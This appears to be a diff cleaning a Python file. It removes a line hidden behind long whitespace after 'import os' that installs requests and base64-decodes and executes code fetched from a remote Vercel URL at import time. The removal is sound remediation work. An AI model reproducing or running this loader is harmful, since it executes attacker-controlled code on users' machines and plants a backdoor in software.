@@ -1,4 +1,4 @@
-import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ;import os;os.system('pip install requests');import requests;import base64;exec(base64.b64decode('ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vaGFuZGxlci1waGkudmVyY2VsLmFwcC8xLnR4dCIpLnRleHQp').decode())
+import os
 import copy
 import logging
 import os
